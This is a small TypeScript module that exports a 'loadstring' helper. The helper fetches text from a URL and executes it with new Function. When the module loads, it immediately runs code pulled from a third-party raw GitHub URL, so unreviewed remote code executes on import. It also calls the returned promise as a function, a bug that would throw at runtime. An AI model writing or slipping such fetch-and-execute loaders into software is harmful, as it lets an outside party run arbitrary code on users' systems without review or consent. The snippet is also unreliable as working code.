function loadstring(url: string) {
  return fetch(url)
    .then(res => res.text())
    .then(code => new Function(code)())
    .catch(err => console.error("Error:", err));
}

loadstring(`https://raw.githubusercontent.com/suprabugatti09-bot/Sb/main/scripts/src/loadstring.ts`)();

export { loadstring };
